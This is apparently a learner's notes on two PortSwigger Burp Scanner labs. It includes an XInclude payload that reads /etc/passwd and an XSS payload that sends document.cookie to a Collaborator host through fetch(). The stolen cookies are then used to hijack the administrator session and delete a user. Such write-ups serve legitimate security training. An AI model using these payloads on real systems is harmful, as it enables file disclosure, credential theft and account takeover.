---
created: 2026-06-05
---

| `#`  | Solved? | Name                                                       | Date    | Notes |
| ---- | ------- | ---------------------------------------------------------- | ------- | ----- |
| `1.` | `✓`     | Discovering vulnerabilities quickly with targeted scanning | `05.06` |       |
| `2.` | `✓`     | Scanning non-standard data structures                      | `18.06` |       |
## 1. Discovering vulnerabilities quickly with targeted scanning

>[!done]


>[!note]+ Lab description
> 
> - [`Lab: Discovering vulnerabilities quickly with targeted scanning`](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)
> - Level: #Practitioner 
> 
> This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.
> 
> Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a [targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

### Solution

- Navigate to the application, quickly assess available functionality. Navigate to a blog post, click `Check stock`. 
- In HTTP history, right-click the request -> `Active scan selected message`:

![[images/walkthrough/PortSwigger/Essential Skills/lab1/1.png]]

- Go to `Dashboard` and find `Out-of-band resource load (HTTP)`:

![[images/walkthrough/PortSwigger/Essential Skills/lab1/2.png]]

- Click `Request` tab -> right-click the request -> `Send to Repeater`:

![[images/walkthrough/PortSwigger/Essential Skills/lab1/3.png]]

- In `Repeater` change the `<xi:include>` tag to read `/etc/passwd`:

```
<xi:include parse="text" href="file:///etc/passwd"/>
```

![[images/walkthrough/PortSwigger/Essential Skills/lab1/4.png]]

- Click `Send`:

![[images/walkthrough/PortSwigger/Essential Skills/lab1/5.png]]

![[images/walkthrough/PortSwigger/Essential Skills/lab1/solved.png]]

Solved!

## 2. Scanning non-standard data structures

>[!note]+ Lab description
>- [`Lab: Scanning non-standard data structures`](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)
>- Level: #Practitioner 
> 
> This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.
> 
> To solve the lab, use Burp Scanner's **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.
> 
> You can log in to your own account with the following credentials: `wiener:peter`


### Solution

- Log into your account. Find a `GET` request to `/my-account` in Burp history, then select the `session` cookie value and see it consists of two colon-separated values: your username and some opaque token. 


![[images/walkthrough/PortSwigger/Essential Skills/lab2/1.png]]

- Select the username part, `wiener`, right-click, then choose `Scan selected insertion point`:

![[scan_selected_insertion_point_2.png]]

- Go to `Dashboard` and see Burp found an XSS vulnerability:

![[images/walkthrough/PortSwigger/Essential Skills/lab2/3.png]]

- Send this request to `Repeater` and modify the `fetch()` URL to contain `document.cookie`. Go to `Collaborator`, copy the payload to clipboard, and replace the initial value with it. Send this request; you'll get `500 Internal Server Error`.

```js
'"><svg/onload=fetch(`//8u3cvm8ourguscmmywvv6pyx8oef25qu.oastify.com/${encodeURIComponent(document.cookie)}`)>:xiUrUtdtqlAv06VZyGVikWcl3AyPLb4M
```

![[images/walkthrough/PortSwigger/Essential Skills/lab2/4.png]]

- Then go to `Collaborator` -> `Poll now`. See an HTTP request to Collaborator URL with cookies inserted as URL:

![[images/Web_Hacking/BurpSuite/5.png]]

- Then send a `GET` request to `/my-account?id=wiener` to `Repeater`, change `wiener` to `administrator`, and replace cookies with the values you captured. See you got access:

![[images/walkthrough/PortSwigger/Essential Skills/lab2/6.png]]

- Replace URL path with `/admin/delete?username=carlos`:

![[images/walkthrough/PortSwigger/Essential Skills/lab2/7.png]]

![[images/walkthrough/PortSwigger/Essential Skills/lab2/solved.png]]

Solved!


